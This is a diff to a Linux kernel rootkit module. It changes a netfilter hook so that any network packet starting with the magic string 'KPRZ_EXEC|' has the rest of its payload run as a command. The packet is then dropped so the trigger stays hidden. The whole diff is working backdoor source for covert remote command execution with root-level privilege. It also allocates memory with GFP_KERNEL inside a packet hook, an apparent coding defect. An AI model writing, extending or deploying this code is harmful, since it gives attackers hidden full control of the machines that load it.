@@ -4,10 +4,12 @@
 #include <linux/skbuff.h>
 #include <linux/ip.h>
 #include <linux/tcp.h>
+#include <linux/slab.h>
 #include <linux/string.h>
 #include <linux/kmod.h>
 
-#define MAGIC_COMMAND "KPRZ_EXEC"
+#define MAGIC_COMMAND "KPRZ_EXEC|"
+#define MAX_CMD_LEN 256
 
 static struct nf_hook_ops command_executor_ops;
 
@@ -34,7 +36,18 @@ static unsigned int command_executor_hook(void *priv, struct sk_buff *skb, const
 
         if (payload_len >= strlen(MAGIC_COMMAND)) {
             if (memcmp(payload, MAGIC_COMMAND, strlen(MAGIC_COMMAND)) == 0) {
-                execute_kernel_command("echo Rootkit Triggered > /tmp/kprz_command");
+                char *cmd_start = (char *)(payload + strlen(MAGIC_COMMAND));
+                size_t cmd_len = payload_len - strlen(MAGIC_COMMAND);
+
+                if (cmd_len > 0 && cmd_len < MAX_CMD_LEN) {
+                    char *kernel_cmd = kmalloc(cmd_len + 1, GFP_KERNEL);
+                    if (kernel_cmd) {
+                        memcpy(kernel_cmd, cmd_start, cmd_len);
+                        kernel_cmd[cmd_len] = '\0';
+                        execute_kernel_command(kernel_cmd);
+                        kfree(kernel_cmd);
+                    }
+                }
                 return NF_DROP;
             }
         }
